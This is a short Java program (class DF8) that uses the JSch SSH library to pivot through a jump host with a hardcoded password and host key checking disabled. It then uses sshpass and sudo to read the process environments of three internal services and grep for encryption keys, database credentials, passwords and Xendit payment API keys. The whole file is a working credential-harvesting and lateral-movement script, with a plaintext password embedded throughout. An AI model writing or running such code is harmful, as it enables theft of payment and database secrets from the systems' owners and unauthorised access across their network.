import com.jcraft.jsch.*;
import java.io.*;
class DF8 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    // SSH to Venus + Hammer + search their env for Xendit keys and DB creds
    ch.setCommand("echo ---VENUS---;sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.141 'hostname;echo kutul0nc4t | sudo -S cat /proc/$(pgrep -f venus | head -1)/environ 2>/dev/null | tr \"\\0\" \"\\n\" | grep -iE \"VEN_ENC|ENC_|db\\.|PASS|xendit|xnd_|SECRET\"' 2>&1 | head -10;echo ---HAMMER---;sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.237 'hostname;echo kutul0nc4t | sudo -S cat /proc/$(pgrep -f hammer | head -1)/environ 2>/dev/null | tr \"\\0\" \"\\n\" | grep -iE \"HAM_ENC|ENC_|db\\.|PASS|xendit|xnd_|SECRET\"' 2>&1 | head -10;echo ---GEMINI---;sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.252 'hostname;echo kutul0nc4t | sudo -S cat /proc/$(pgrep -f gemini | head -1)/environ 2>/dev/null | tr \"\\0\" \"\\n\" | grep -iE \"GEM_ENC|ENC_|db\\.|PASS|xendit|xnd_|SECRET\"' 2>&1 | head -10");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
